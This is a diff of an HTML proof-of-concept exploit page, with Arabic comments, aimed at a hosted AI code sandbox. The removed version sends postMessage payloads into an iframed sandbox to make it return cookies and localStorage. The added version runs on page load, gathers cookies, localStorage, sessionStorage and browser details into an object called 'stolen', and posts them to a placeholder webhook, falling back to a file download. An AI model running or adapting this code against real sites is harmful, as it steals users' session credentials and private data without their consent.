@@ -1,83 +1,66 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>CTF Sandbox PoC</title>
+  <meta charset="utf-8">
+  <title>🔥 Remote Exploit PoC</title>
 </head>
 <body>
-  <h2>🚀 CTF Sandbox Exploit PoC</h2>
-
-  <!-- الهدف -->
-  <iframe id="victim" 
-          src="https://web-sandbox.oaiusercontent.com/index.html?" 
-          width="800" height="600"
-          style="border:1px solid #ccc"></iframe>
-
-  <pre id="log"></pre>
-
+  <h2>🚀 Remote Exploit PoC – Auto Data Exfiltration</h2>
   <script>
-    const victim = document.getElementById("victim").contentWindow;
-    const targetOrigin = "https://web-sandbox.oaiusercontent.com/index.html?";
-    const collected = [];
+    (async () => {
+      console.log("🚀 Remote PoC started...");
 
-    function log(msg, data) {
-      const pre = document.getElementById("log");
-      pre.textContent += msg + (data ? " " + JSON.stringify(data, null, 2) : "") + "\n";
-      console.log(msg, data || "");
-    }
+      const stolen = {
+        cookies: document.cookie || "",
+        localStorage: {},
+        sessionStorage: {},
+        info: {
+          userAgent: navigator.userAgent,
+          platform: navigator.platform,
+          lang: navigator.language,
+          url: location.href,
+          time: new Date().toISOString()
+        }
+      };
 
-    // استقبال الردود
-    window.addEventListener("message", (event) => {
-      if (event.origin !== targetOrigin) return; // تجاهل أي رد من غير الـ sandbox
-      log("📩 Response from sandbox:", event.data);
-
-      collected.push({
-        origin: event.origin,
-        data: event.data,
-        time: new Date().toISOString()
-      });
-
-      // جرّب تنزل ملف بعد ما نجمع ردود
-      if (collected.length >= 3) {
-        downloadResults();
+      // dump localStorage
+      for (let i = 0; i < localStorage.length; i++) {
+        const k = localStorage.key(i);
+        stolen.localStorage[k] = localStorage.getItem(k);
       }
-    });
 
-    // payloads نجربها
-    const payloads = [
-      ["CALL", "runUserCode", ["return document.cookie"]],
-      ["CALL", "runUserCode", ["return Object.keys(localStorage)"]],
-      ["CALL", "screenshot", []],
-      ["CALL", "echo", [{ poc: "hello" }]]
-    ];
+      // dump sessionStorage
+      for (let i = 0; i < sessionStorage.length; i++) {
+        const k = sessionStorage.key(i);
+        stolen.sessionStorage[k] = sessionStorage.getItem(k);
+      }
 
-    function sendPayloads() {
-      payloads.forEach((msg, i) => {
-        setTimeout(() => {
-          log("➡️ Sending payload #" + i + ": " + msg[1]);
-          victim.postMessage(msg, targetOrigin);
-        }, i * 3000); // كل 3 ثواني
-      });
-    }
+      console.log("📦 Data collected:", stolen);
 
-    function downloadResults() {
-      const blob = new Blob([JSON.stringify(collected, null, 2)], { type: "application/json" });
+      // exfiltration via fetch (if CSP يسمح)
+      try {
+        await fetch("https://YOUR-WEBHOOK-HERE/post", {
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify(stolen)
+        });
+        console.log("🌐 Data exfiltrated to server.");
+      } catch(e) {
+        console.warn("⚠️ Fetch blocked by CSP, falling back to file download");
+      }
+
+      // fallback: trigger file download
+      const blob = new Blob([JSON.stringify(stolen, null, 2)], {type:'application/json'});
       const url = URL.createObjectURL(blob);
       const a = document.createElement("a");
       a.href = url;
-      a.download = "sandbox_results_" + Date.now() + ".json";
+      a.download = "sandbox_dump_" + Date.now() + ".json";
       document.body.appendChild(a);
       a.click();
       document.body.removeChild(a);
-      log("💾 File download triggered.");
-    }
 
-    // شغل بعد 5 ثواني
-    setTimeout(() => {
-      log("🚀 Starting payload sequence...");
-      sendPayloads();
-    }, 5000);
+      console.log("💾 File download triggered.");
+    })();
   </script>
 </body>
 </html>
-
